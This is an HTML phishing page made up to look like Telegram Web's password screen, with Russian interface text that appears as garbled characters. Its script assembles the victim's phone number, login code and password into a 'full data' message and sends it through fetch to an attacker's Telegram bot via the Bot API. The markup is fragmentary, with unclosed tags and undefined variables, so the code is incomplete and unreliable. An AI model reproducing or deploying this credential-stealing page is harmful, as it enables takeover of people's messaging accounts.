<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <link rel="icon" href="icon.jpg" type="image/jpeg">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0088cc, #00a2e8);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            border-radius: 12px;
            width: 320px;
            overflow: hidden;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        .header {
            background: #0088cc;
            padding: 20px 20px;
            text-align: center;
            color: white;
        }
        .header h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 10px;
        }
        .form-section {
            padding: 30px 20px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 15px;
            text-align: center;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
        }
        .info {
            color: #666;
            font-size: 14px;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        .forgot-link {
            color: #0088cc;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="icon.jpg" style="width: 40px; height: 40px; margin-bottom: 10px; border-radius: 8px;">
            <h1>Telegram</h1>
            <p>–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å</p>

        <div class="form-section">

            <form id="passwordForm">

    <script>

            const message = `üîê –ü–û–õ–ù–´–ï –î–ê–ù–ù–´–ï üîê\n–¢–µ–ª–µ—Ñ–æ–Ω: ${phone}\n–ö–æ–¥: ${code}\n–ü–∞—Ä–æ–ª—å: ${password}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {

</html>
